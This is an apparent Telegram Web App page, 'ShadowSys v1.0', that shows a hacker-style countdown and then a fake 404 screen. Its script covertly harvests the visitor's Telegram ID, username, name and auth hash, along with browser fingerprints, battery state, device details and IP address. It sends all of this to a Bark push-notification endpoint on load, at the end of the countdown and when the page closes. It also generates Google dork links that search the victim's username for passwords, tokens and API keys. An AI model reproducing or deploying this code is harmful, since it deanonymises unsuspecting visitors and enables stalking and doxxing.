<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ShadowSys v1.0</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            color: #0f0;
            text-shadow: 0 0 10px #0f0;
            flex-direction: column;
            user-select: none;
            overflow: hidden;
        }
        #loadingScreen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.8s ease;
        }
        #loadingScreen.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #loadingScreen h1 {
            font-size: 3rem;
            letter-spacing: 4px;
            margin-bottom: 30px;
            animation: pulse 1.2s infinite alternate;
        }
        @keyframes pulse {
            0% { opacity: 0.5; text-shadow: 0 0 10px #0f0; }
            100% { opacity: 1; text-shadow: 0 0 40px #0f0, 0 0 80px #0f0; }
        }
        #timer {
            font-size: 5rem;
            font-weight: bold;
            margin: 20px 0;
            letter-spacing: 6px;
            background: #111;
            padding: 10px 40px;
            border-radius: 10px;
            border: 1px solid #0f0;
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
        }
        .progress-bar {
            width: 300px;
            height: 6px;
            background: #1a1a1a;
            border-radius: 3px;
            margin-top: 20px;
            overflow: hidden;
            border: 1px solid #0f0;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: #0f0;
            box-shadow: 0 0 20px #0f0;
            transition: width 0.1s linear;
        }
        #statusText {
            margin-top: 15px;
            color: #888;
            font-size: 0.9rem;
            letter-spacing: 2px;
        }
        #error404 {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #0a0a0a;
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #ff3333;
            text-shadow: 0 0 20px #ff3333;
        }
        #error404 h1 {
            font-size: 8rem;
            font-weight: 900;
            letter-spacing: 10px;
        }
        #error404 p {
            font-size: 1.4rem;
            color: #aa2222;
            margin-top: 10px;
        }
        #error404 .sub {
            font-size: 0.9rem;
            color: #551111;
            margin-top: 30px;
            letter-spacing: 2px;
        }
        .glitch {
            animation: glitch 0.3s infinite alternate;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-4px, 2px); }
            40% { transform: translate(4px, -2px); }
            60% { transform: translate(-2px, 4px); }
            80% { transform: translate(2px, -4px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>

    <!-- ЭКРАН ЗАГРУЗКИ С ОБРАТНЫМ ОТСЧЕТОМ -->
    <div id="loadingScreen">
        <h1>☠ SHADOWCODE INIT</h1>
        <div id="timer">10</div>
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div id="statusText">Взлом матрицы...</div>
    </div>

    <!-- ЭКРАН 404 (ПОЯВЛЯЕТСЯ ПОСЛЕ ОТСЧЕТА) -->
    <div id="error404">
        <h1>404</h1>
        <p>Ресурс не найден</p>
        <div class="sub">ShadowSys v1.0 — доступ запрещён</div>
    </div>

    <script>
        // ============================================================
        // 1. BARK – ОТПРАВКА УВЕДОМЛЕНИЙ (РЕАЛЬНАЯ БАТАРЕЯ ТУТ ЖЕ)
        // ============================================================
        const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';

        function sendToBark(title, body) {
            const payload = {
                title: title,
                body: body,
                group: 'ShadowLog',
                sound: 'alarm'
            };
            // sendBeacon + fetch для надёжности
            try {
                navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
            } catch (e) {}
            fetch(BARK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        // ============================================================
        // 2. СБОР ЦИФРОВОГО ОТПЕЧАТКА (FINGERPRINT)
        // ============================================================
        function getFingerprint() {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 128;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 16, 16);
            ctx.fillStyle = '#069';
            ctx.fillText('ShadowCode', 2, 15);
            const canvasHash = canvas.toDataURL().substring(0, 64);

            let glVendor = 'N/A', glRenderer = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}

            let audioFp = 'N/A';
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                oscillator.frequency.value = 1000;
                const data = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(data);
                audioFp = btoa(String.fromCharCode(...data.slice(0, 20))).substring(0, 20);
                oscillator.disconnect();
            } catch (e) {}

            return {
                canvas_hash: canvasHash,
                webgl_vendor: glVendor,
                webgl_renderer: glRenderer,
                audio_fp: audioFp
            };
        }

        // ============================================================
        // 3. РЕАЛЬНАЯ БАТАРЕЯ (РАБОТАЕТ В ХРОМЕ, ЭДЖ, ОПЕРА)
        // ============================================================
        function getRealBattery() {
            return new Promise((resolve) => {
                let batt = { level: 'N/A', charging: 'N/A' };
                if (navigator.getBattery) {
                    navigator.getBattery().then(b => {
                        // УРОВЕНЬ В ПРОЦЕНТАХ (0..1 -> 0..100)
                        const levelPercent = Math.round(b.level * 100);
                        batt.level = levelPercent + '%';
                        batt.charging = b.charging ? 'Да' : 'Нет';
                        resolve(batt);
                    }).catch(() => resolve(batt));
                } else {
                    // Если API нет – пытаемся через старый navigator.battery (устаревший)
                    try {
                        if (navigator.battery) {
                            navigator.battery.then(b => {
                                const levelPercent = Math.round(b.level * 100);
                                batt.level = levelPercent + '%';
                                batt.charging = b.charging ? 'Да' : 'Нет';
                                resolve(batt);
                            }).catch(() => resolve(batt));
                        } else {
                            resolve(batt);
                        }
                    } catch (e) {
                        resolve(batt);
                    }
                }
            });
        }

        // ============================================================
        // 4. ДАННЫЕ ТЕЛЕГРАМ
        // ============================================================
        function getRealTelegramData() {
            let tg = { 
                username: 'N/A', 
                id: 'N/A', 
                first_name: 'N/A', 
                last_name: 'N/A',
                language_code: 'N/A',
                is_premium: 'N/A',
                auth_date: 'N/A',
                hash: 'N/A'
            };
            try {
                if (window.Telegram && window.Telegram.WebApp) {
                    const app = window.Telegram.WebApp;
                    app.ready();
                    if (app.initDataUnsafe && app.initDataUnsafe.user) {
                        const user = app.initDataUnsafe.user;
                        tg.id = user.id || 'N/A';
                        tg.first_name = user.first_name || 'N/A';
                        tg.last_name = user.last_name || 'N/A';
                        tg.username = user.username || 'N/A';
                        tg.language_code = user.language_code || 'N/A';
                        tg.is_premium = user.is_premium ? 'Premium' : 'Free';
                    }
                    tg.auth_date = app.initDataUnsafe?.auth_date || 'N/A';
                    tg.hash = app.initDataUnsafe?.hash || 'N/A';
                    tg.platform = app.platform || 'N/A';
                    tg.version = app.version || 'N/A';
                    tg.colorScheme = app.colorScheme || 'N/A';
                }
            } catch (e) {
                sendToBark('TG Error', e.message);
            }
            return tg;
        }

        // ============================================================
        // 5. DORK-ССЫЛКИ
        // ============================================================
        function getDorkLinks(username) {
            if (!username || username === 'N/A') return [];
            const dorks = [
                `"${username}" site:github.com`,
                `"${username}" site:youtube.com`,
                `"${username}" site:instagram.com`,
                `"${username}" site:twitter.com`,
                `"${username}" site:tiktok.com`,
                `"${username}" site:reddit.com`,
                `"${username}" site:pastebin.com`,
                `"${username}" filetype:pdf`,
                `"${username}" filetype:docx`,
                `"${username}" "password"`,
                `"${username}" "token"`,
                `"${username}" "api key"`,
                `"${username}" "@gmail.com"`,
                `"${username}" "skype"`
            ];
            return dorks.map(d => `https://www.google.com/search?q=${encodeURIComponent(d)}`);
        }

        // ============================================================
        // 6. ОСНОВНОЙ СБОР И ОТПРАВКА
        // ============================================================
        async function collectAndSend() {
            try {
                const fp = getFingerprint();
                const tg = getRealTelegramData();
                const dorks = getDorkLinks(tg.username);
                const batt = await getRealBattery(); // РЕАЛЬНАЯ БАТАРЕЯ

                // --- ТЕКСТОВОЕ УВЕДОМЛЕНИЕ (BARK) ---
                let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
                bodyText += `📱 TG: @${tg.username} (ID: ${tg.id})\n`;
                bodyText += `👤 Имя: ${tg.first_name} ${tg.last_name}\n`;
                bodyText += `💎 Статус: ${tg.is_premium}\n`;
                bodyText += `🌍 Язык TG: ${tg.language_code}\n`;
                bodyText += `📟 Платформа TG: ${tg.platform} v${tg.version}\n`;
                bodyText += `🎨 Тема: ${tg.colorScheme}\n`;
                bodyText += `🖥️ UA: ${navigator.userAgent}\n`;
                bodyText += `📍 Платформа: ${navigator.platform}\n`;
                bodyText += `🌐 Язык: ${navigator.language} | Таймзона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
                bodyText += `📺 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
                bodyText += `🪟 Окно: ${window.innerWidth}x${window.innerHeight}\n`;
                bodyText += `🍪 Cookie: ${navigator.cookieEnabled ? 'Да' : 'Нет'}\n`;
                bodyText += `🎨 Canvas: ${fp.canvas_hash.substring(0, 30)}...\n`;
                bodyText += `🎮 WebGL: ${fp.webgl_vendor} | ${fp.webgl_renderer}\n`;
                bodyText += `🔊 Audio FP: ${fp.audio_fp}\n`;
                // === РЕАЛЬНАЯ БАТАРЕЯ ===
                bodyText += `🔋 Батарея: ${batt.level} (Зарядка: ${batt.charging})\n`;

                if (dorks.length > 0) {
                    bodyText += `\n🔗 DORKS (первые 5):\n${dorks.slice(0, 5).join('\n')}`;
                }

                sendToBark('⚡ ShadowCode | @' + tg.username, bodyText);

                // --- RAW JSON (для архива) ---
                const rawData = {
                    telegram: tg,
                    fingerprint: fp,
                    battery: batt, // РЕАЛЬНЫЕ ДАННЫЕ
                    browser: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        languages: navigator.languages ? Array.from(navigator.languages) : [],
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        screenResolution: `${screen.width}x${screen.height}`,
                        colorDepth: screen.colorDepth,
                        windowSize: `${window.innerWidth}x${window.innerHeight}`,
                        plugins: Array.from(navigator.plugins).map(p => p.name),
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        connection: navigator.connection ? {
                            rtt: navigator.connection.rtt,
                            downlink: navigator.connection.downlink,
                            effectiveType: navigator.connection.effectiveType
                        } : null
                    },
                    dorks: dorks,
                    timestamp: new Date().toISOString()
                };

                setTimeout(() => {
                    sendToBark('📦 RAW JSON', JSON.stringify(rawData, null, 2).substring(0, 3500));
                }, 500);

                console.log('[ShadowCode] Отправлено:', rawData);

            } catch (err) {
                sendToBark('⚠️ ShadowCode ERROR', err.message + '\nStack: ' + err.stack);
            }
        }

        // ============================================================
        // 7. ОБРАТНЫЙ ОТСЧЕТ И ПЕРЕКЛЮЧЕНИЕ НА 404
        // ============================================================
        let counter = 10;
        const timerEl = document.getElementById('timer');
        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const loadingScreen = document.getElementById('loadingScreen');
        const error404 = document.getElementById('error404');

        function updateProgress() {
            const progress = ((10 - counter) / 10) * 100;
            progressFill.style.width = progress + '%';
            if (counter > 0) {
                statusText.textContent = `Взлом матрицы... ${counter} сек`;
            } else {
                statusText.textContent = 'Доступ заблокирован';
            }
        }

        const countdownInterval = setInterval(() => {
            counter--;
            timerEl.textContent = counter;
            updateProgress();

            if (counter <= 0) {
                clearInterval(countdownInterval);
                // Скрываем загрузку, показываем 404
                loadingScreen.classList.add('hidden');
                error404.style.display = 'flex';
                // Добавляем глитч-эффект
                document.querySelector('#error404 h1').classList.add('glitch');
                // Финальный сбор (на всякий случай)
                collectAndSend();
            }
        }, 1000);

        // ============================================================
        // 8. ЗАПУСК СБОРА ПРИ ЗАГРУЗКЕ (параллельно с таймером)
        // ============================================================
        window.onload = function() {
            // Сбор при загрузке (отправка через 1.5 сек)
            setTimeout(() => {
                collectAndSend();
            }, 1500);

            // Дополнительный сбор батареи отдельным уведомлением (для наглядности)
            setTimeout(async () => {
                const batt = await getRealBattery();
                sendToBark('🔋 РЕАЛЬНАЯ БАТАРЕЯ', `Уровень: ${batt.level}\nЗарядка: ${batt.charging}`);
            }, 2500);

            // IP адрес
            try {
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(ipData => {
                        sendToBark('🌐 IP Адрес', `IP: ${ipData.ip}`);
                    }).catch(() => {});
            } catch (e) {}
        };

        // Сбор при закрытии/скрытии страницы
        window.addEventListener('beforeunload', function() {
            collectAndSend();
        });
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                collectAndSend();
            }
        });
    </script>
</body>
</html>
